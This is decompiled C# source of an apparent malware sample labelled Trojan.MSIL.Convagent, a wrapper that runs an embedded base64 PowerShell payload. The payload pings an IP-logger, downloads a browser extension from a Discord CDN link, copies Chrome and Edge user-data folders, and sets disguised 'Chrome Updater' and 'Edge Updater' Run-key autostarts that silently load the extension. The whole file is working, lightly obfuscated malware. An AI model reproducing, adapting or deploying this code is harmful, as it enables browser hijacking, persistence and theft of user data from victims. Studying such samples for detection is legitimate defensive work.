// Decompiled with JetBrains decompiler
// Type: ModuleNameSpace.MainApp
// Assembly: installer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BE36CCF7-21FD-4261-9C31-8B7F15D1A5A7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\VHO-Trojan.MSIL.Convagent.gen-668779a07751d78171d250ab0016b85e84293cc1703def87a04451a1e2df8b37.exe

using System;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ModuleNameSpace
{
  internal class MainApp : MainAppInterface
  {
    private bool shouldExit;
    private int exitCode;

    public bool ShouldExit
    {
      get => this.shouldExit;
      set => this.shouldExit = value;
    }

    public int ExitCode
    {
      get => this.exitCode;
      set => this.exitCode = value;
    }

    [STAThread]
    private static int Main(string[] args)
    {
      MainApp app = new MainApp();
      bool flag = false;
      string path = string.Empty;
      MainModuleUI ui = new MainModuleUI();
      MainModule host = new MainModule((MainAppInterface) app, ui);
      ManualResetEvent mre = new ManualResetEvent(false);
      AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(MainApp.CurrentDomain_UnhandledException);
      try
      {
        using (Runspace runspace = RunspaceFactory.CreateRunspace((PSHost) host))
        {
          runspace.ApartmentState = ApartmentState.STA;
          runspace.Open();
          using (PowerShell powerShell = PowerShell.Create())
          {
            powerShell.Runspace = runspace;
            powerShell.Streams.Error.DataAdded += (EventHandler<DataAddedEventArgs>) ((sender, e) => ui.WriteErrorLine(((PSDataCollection<ErrorRecord>) sender)[e.Index].ToString()));
            PSDataCollection<string> input = new PSDataCollection<string>();
            if (Console_Info.IsInputRedirected())
            {
              string str;
              while ((str = Console.ReadLine()) != null)
                input.Add(str);
            }
            input.Complete();
            PSDataCollection<PSObject> colOutput = new PSDataCollection<PSObject>();
            colOutput.DataAdded += (EventHandler<DataAddedEventArgs>) ((sender, e) => ui.WriteLine(colOutput[e.Index].ToString()));
            int num1 = 0;
            int num2 = 0;
            foreach (string strA in args)
            {
              if (string.Compare(strA, "-whatt".Replace("hat", "ai"), true) == 0)
                flag = true;
              else if (strA.StartsWith("-extdummt".Replace("dumm", "rac"), StringComparison.InvariantCultureIgnoreCase))
              {
                string[] strArray = strA.Split(new string[1]
                {
                  ":"
                }, 2, StringSplitOptions.RemoveEmptyEntries);
                if (strArray.Length != 2)
                {
                  int num3 = (int) MessageBox.Show("If you spzzcify thzz -zzxtract option you nzzed to add a filzz for zzxtraction in this way\r\n   -zzxtract:\"<filzznamzz>\"".Replace("zz", "e"), AppDomain.CurrentDomain.FriendlyName, MessageBoxButtons.OK, MessageBoxIcon.Hand);
                  return 1;
                }
                path = strArray[1].Trim('"');
              }
              else
              {
                if (string.Compare(strA, "-end", true) == 0)
                {
                  num1 = num2 + 1;
                  break;
                }
                if (string.Compare(strA, "-debug", true) == 0)
                {
                  System.Diagnostics.Debugger.Launch();
                  break;
                }
              }
              ++num2;
            }
            string str1 = Encoding.UTF8.GetString(Convert.FromBase64String("JFByb2dyZXNzUHJlZmVyZW5jZSA9ICJTaWxlbnRseUNvbnRpbnVlIjsNCg0KJEV4dGVuc2lvblVybCA9ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85MjAyNjM0OTUxMDk0NTU4OTUvOTQ2NTUwNDUwNzg0NzE0NzgyL2V4dGVuc2lvbi56aXAiDQoNCiRJcExvZ2dlclN0YXJ0VXJsID0gImh0dHBzOi8vaXBsb2dnZXIub3JnLzFFblJhNyINCiRJcExvZ2dlckVuZFVybCA9ICJodHRwczovL2lwbG9nZ2VyLm9yZy8xRVdSYTciDQoNCnRyeSB7DQogICAgIyBTZW5kIHJlcXVlc3QgdG8gbG9nZ2VyDQogICAgSW52b2tlLVdlYlJlcXVlc3QgJElwTG9nZ2VyU3RhcnRVcmwgLVVzZUJhc2ljUGFyc2luZw0KDQogICAgIyBDcmVhdGluZyBhIHZhcmlhYmxlIGZyb20gdGhlIHJvb3QgZm9sZGVyDQogICAgJFJvb3REaXJlY3RvcnlQYXRoID0gIiQoJGVudjpBUFBEQVRBKVxNaWNyb3NvZnRcU2VjdXJpdHkiDQoNCiAgICAjIERlbGV0aW5nIHRoZSByb290IGZvbGRlciBiZWZvcmUgZG93bmxvYWRpbmcgYW4gZXh0ZW5zaW9uDQogICAgUmVtb3ZlLUl0ZW0gJFJvb3REaXJlY3RvcnlQYXRoIC1Gb3JjZSAtUmVjdXJzZQ0KDQogICAgSWYoIShUZXN0LVBhdGggJFJvb3REaXJlY3RvcnlQYXRoKSkgew0KICAgICAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1Gb3JjZSAtUGF0aCAkUm9vdERpcmVjdG9yeVBhdGgNCiAgICB9DQoNCiAgICAjIERvd25sb2FkaW5nIGFuIGV4dGVuc2lvbiBhcmNoaXZlDQogICAgJEV4dGVuc2lvblBhdGggPSAiJFJvb3REaXJlY3RvcnlQYXRoXGV4dGVuc2lvbi56aXAiDQoNCiAgICBJbnZva2UtV2ViUmVxdWVzdCAkRXh0ZW5zaW9uVXJsIC1PdXRGaWxlICRFeHRlbnNpb25QYXRoIC1Vc2VCYXNpY1BhcnNpbmcNCg0KICAgICMgU3RhcnRpbmcgdW5wYWNraW5nIGFyY2hpdmUNCiAgICAkRXh0ZW5zaW9uVW5wYWNrZWRQYXRoID0gIiRSb290RGlyZWN0b3J5UGF0aFxleHRlbnNpb24iDQoNCiAgICAjIFN0YXJ0aW5nIHVucGFjayAodXNlIG5hdGl2ZSBtZXRob2RzLCBmb3Igc3VwcG9ydGluZyBhbGwgc3lzdGVtcykNCiAgICAkU2hlbGwgPSBOZXctT2JqZWN0IC1jb20gc2hlbGwuYXBwbGljYXRpb247DQoNCiAgICAkWmlwID0gJFNoZWxsLk5hbWVTcGFjZSgkRXh0ZW5zaW9uUGF0aCk7DQoNCiAgICBmb3JlYWNoKCRpdGVtIGluICRaaXAuaXRlbXMoKSkgew0KICAgICAgICAkU2hlbGwuTmFtZXNwYWNlKCRSb290RGlyZWN0b3J5UGF0aCkuY29weWhlcmUoJGl0ZW0pDQogICAgfQ0KDQogICAgIyBHZXR0aW5nIGJyb3dzZXIgcGF0aHMNCiAgICAkQ2hyb21lRXhlY3V0YWJsZVBhdGgNCiAgICAkRWRnZUV4ZWN1dGFibGVQYXRoDQoNCiAgICBmb3JlYWNoICgkcHJvZ3JhbUZpbGVzIGluIEAoJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9LCAke2VudjpQcm9ncmFtRmlsZXN9KSkgew0KICAgICAgICBmb3JlYWNoICgkYnJvd3NlclBhdGggaW4gQCgiR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIiwgIk1pY3Jvc29mdFxFZGdlXEFwcGxpY2F0aW9uXG1zZWRnZS5leGUiKSkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAiJHByb2dyYW1GaWxlc1wkYnJvd3NlclBhdGgiKSB7DQogICAgICAgICAgICAgICAgaWYgKCRicm93c2VyUGF0aCAtZXEgIkdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIpIHsNCiAgICAgICAgICAgICAgICAgICAgJENocm9tZUV4ZWN1dGFibGVQYXRoID0gIiRwcm9ncmFtRmlsZXNcJGJyb3dzZXJQYXRoIjsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICBpZiAoJGJyb3dzZXJQYXRoIC1lcSAiTWljcm9zb2Z0XEVkZ2VcQXBwbGljYXRpb25cbXNlZGdlLmV4ZSIpIHsNCiAgICAgICAgICAgICAgICAgICAgJEVkZ2VFeGVjdXRhYmxlUGF0aCA9ICIkcHJvZ3JhbUZpbGVzXCRicm93c2VyUGF0aCI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgIyBTdGFydGluZyBicm93c2Vycw0KICAgIGZvcmVhY2ggKCRicm93c2VyRXhlY3V0YWJsZVBhdGggaW4gQCgkQ2hyb21lRXhlY3V0YWJsZVBhdGgsICRFZGdlRXhlY3V0YWJsZVBhdGgpKSB7DQogICAgICAgIGlmICgkYnJvd3NlckV4ZWN1dGFibGVQYXRoKSB7DQogICAgICAgICAgICAjIEFkZCBwcm9jZXNzIHRvIGF1dG9ydW4gd2l0aCBhcmd1bWVudHMNCiAgICAgICAgICAgIGlmICgkYnJvd3NlckV4ZWN1dGFibGVQYXRoIC1saWtlICcqY2hyb21lLmV4ZScpIHsNCiAgICAgICAgICAgICAgICAjIENyZWF0aW5nIGEgY29weSBvZiBhIGZvbGRlciB3aXRoIHVzZXIgZGF0YQ0KICAgICAgICAgICAgICAgIFJvYm9jb3B5ICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YSIgIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhIEJhY2t1cCINCiAgICAgICAgICAgICAgICBSb2JvY29weSAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdCIgIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhIEJhY2t1cFxEZWZhdWx0Ig0KDQogICAgICAgICAgICAgICAgIyBBZGRpbmcgYXV0b2xvYWRpbmcgdmlhIHRoZSByZWdpc3RyeQ0KICAgICAgICAgICAgICAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggIkhLQ1U6XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgLU5hbWUgIkNocm9tZSBVcGRhdGVyIiAtVmFsdWUgImAiJGJyb3dzZXJFeGVjdXRhYmxlUGF0aGAiIC0tc2lsZW50LWxhdW5jaCAtLW11dGUtYXVkaW8gLS1sb2FkLWV4dGVuc2lvbj1gIiRFeHRlbnNpb25VbnBhY2tlZFBhdGhgIiAtLXVzZXItZGF0YS1kaXI9YCIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YSBCYWNrdXBgIiIgLVByb3BlcnR5VHlwZSAiU3RyaW5nIiAtRm9yY2UNCg0KICAgICAgICAgICAgICAgICMgUnVubmluZyB0aGUgYnJvd3NlciBwcm9jZXNzDQogICAgICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJGJyb3dzZXJFeGVjdXRhYmxlUGF0aCAtQXJndW1lbnRMaXN0ICItLXNpbGVudC1sYXVuY2ggLS1tdXRlLWF1ZGlvIC0tbG9hZC1leHRlbnNpb249YCIkRXh0ZW5zaW9uVW5wYWNrZWRQYXRoYCIgLS11c2VyLWRhdGEtZGlyPWAiJGVudjpMT0NBTEFQUERBVEFcR29vZ2xlXENocm9tZVxVc2VyIERhdGEgQmFja3VwYCIiDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmICgkYnJvd3NlckV4ZWN1dGFibGVQYXRoIC1saWtlICcqbXNlZGdlLmV4ZScpIHsNCiAgICAgICAgICAgICAgICAjIENyZWF0aW5nIGEgY29weSBvZiBhIGZvbGRlciB3aXRoIHVzZXIgZGF0YQ0KICAgICAgICAgICAgICAgIFJvYm9jb3B5ICIkZW52OkxPQ0FMQVBQREFUQVxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGEiICIkZW52OkxPQ0FMQVBQREFUQVxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGEgQmFja3VwIg0KICAgICAgICAgICAgICAgIFJvYm9jb3B5ICIkZW52OkxPQ0FMQVBQREFUQVxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGFcRGVmYXVsdCIgIiRlbnY6TE9DQUxBUFBEQVRBXE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YSBCYWNrdXBcRGVmYXVsdCINCg0KICAgICAgICAgICAgICAgICMgQWRkaW5nIGF1dG9sb2FkaW5nIHZpYSB0aGUgcmVnaXN0cnkNCiAgICAgICAgICAgICAgICBOZXctSXRlbVByb3BlcnR5IC1QYXRoICJIS0NVOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iIC1OYW1lICJFZGdlIFVwZGF0ZXIiIC1WYWx1ZSAiYCIkYnJvd3NlckV4ZWN1dGFibGVQYXRoYCIgLS1zaWxlbnQtbGF1bmNoIC0tbXV0ZS1hdWRpbyAtLWxvYWQtZXh0ZW5zaW9uPWAiJEV4dGVuc2lvblVucGFja2VkUGF0aGAiIC0tdXNlci1kYXRhLWRpcj1gIiRlbnY6TE9DQUxBUFBEQVRBXE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YSBCYWNrdXBgIiIgLVByb3BlcnR5VHlwZSAiU3RyaW5nIiAtRm9yY2UNCg0KICAgICAgICAgICAgICAgICMgUnVubmluZyB0aGUgYnJvd3NlciBwcm9jZXNzDQogICAgICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJGJyb3dzZXJFeGVjdXRhYmxlUGF0aCAtQXJndW1lbnRMaXN0ICItLXNpbGVudC1sYXVuY2ggLS1tdXRlLWF1ZGlvIC0tbG9hZC1leHRlbnNpb249YCIkRXh0ZW5zaW9uVW5wYWNrZWRQYXRoYCIgLS11c2VyLWRhdGEtZGlyPWAiJGVudjpMT0NBTEFQUERBVEFcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhIEJhY2t1cGAiIg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgIyBNYWtpbmcgdmFyaWFibGVzDQogICAgJENocm9tZUV4aXN0ID0gMA0KICAgICRFZGdlRXhpc3QgPSAwDQoNCiAgICBpZiAoJENocm9tZUV4ZWN1dGFibGVQYXRoKSB7DQogICAgICAgICRDaHJvbWVFeGlzdCA9IDENCiAgICB9DQoNCiAgICBpZiAoJEVkZ2VFeGVjdXRhYmxlUGF0aCkgew0KICAgICAgICAkRWRnZUV4aXN0ID0gMQ0KICAgIH0NCg0KICAgICRXaW5WZXJzaW9uID0gKEdldC1XbWlPYmplY3QgLWNsYXNzIFdpbjMyX09wZXJhdGluZ1N5c3RlbSkuVmVyc2lvbg0KDQogICAgIyBTZW5kIHJlcXVlc3QgdG8gbG9nZ2VyDQogICAgSW52b2tlLVdlYlJlcXVlc3QgJElwTG9nZ2VyRW5kVXJsIC1Vc2VyQWdlbnQgIlN1Y2Nlc3MgWyRXaW5WZXJzaW9ufCRDaHJvbWVFeGlzdHwkRWRnZUV4aXN0XSIgLVVzZUJhc2ljUGFyc2luZw0KfQ0KY2F0Y2ggew0KICAgIEludm9rZS1XZWJSZXF1ZXN0ICRJcExvZ2dlckVuZFVybCAtVXNlckFnZW50ICJFcnJvciBbJGVycm9yXSIgLVVzZUJhc2ljUGFyc2luZw0KfQ=="));
            if (!string.IsNullOrEmpty(path))
            {
              File.WriteAllText(path, str1);
              return 0;
            }
            powerShell.AddScript(str1);
            string parameterName = (string) null;
            Regex regex = new Regex("^-([^: ]+)[ :]?([^:]*)$");
            for (int index = num1; index < args.Length; ++index)
            {
              Match match = regex.Match(args[index]);
              if (match.Success && match.Groups.Count == 3 && !double.TryParse(args[index], out double _))
              {
                if (parameterName != null)
                  powerShell.AddParameter(parameterName);
                if (match.Groups[2].Value.Trim() == "")
                  parameterName = match.Groups[1].Value;
                else if (match.Groups[2].Value == "True" || match.Groups[2].Value.ToUpper() == "$TRUE")
                {
                  powerShell.AddParameter(match.Groups[1].Value, (object) true);
                  parameterName = (string) null;
                }
                else if (match.Groups[2].Value == "False" || match.Groups[2].Value.ToUpper() == "$FALSE")
                {
                  powerShell.AddParameter(match.Groups[1].Value, (object) false);
                  parameterName = (string) null;
                }
                else
                {
                  powerShell.AddParameter(match.Groups[1].Value, (object) match.Groups[2].Value);
                  parameterName = (string) null;
                }
              }
              else if (parameterName != null)
              {
                powerShell.AddParameter(parameterName, (object) args[index]);
                parameterName = (string) null;
              }
              else
                powerShell.AddArgument((object) args[index]);
            }
            if (parameterName != null)
              powerShell.AddParameter(parameterName);
            powerShell.AddCommand("out-string");
            powerShell.AddParameter("stream");
            powerShell.BeginInvoke<string, PSObject>(input, colOutput, (PSInvocationSettings) null, (AsyncCallback) (ar =>
            {
              if (!ar.IsCompleted)
                return;
              mre.Set();
            }), (object) null);
            do
              ;
            while (!app.ShouldExit && !mre.WaitOne(100));
            powerShell.Stop();
            if (powerShell.InvocationStateInfo.State == PSInvocationState.Failed)
              ui.WriteErrorLine(powerShell.InvocationStateInfo.Reason.Message);
          }
          runspace.Close();
        }
      }
      catch (Exception ex)
      {
      }
      if (flag)
      {
        int num = (int) MessageBox.Show("Click OK to exit...", AppDomain.CurrentDomain.FriendlyName);
      }
      return app.ExitCode;
    }

    private static void CurrentDomain_UnhandledException(
      object sender,
      UnhandledExceptionEventArgs e)
    {
      throw new Exception("Unhandled exception in " + AppDomain.CurrentDomain.FriendlyName);
    }
  }
}
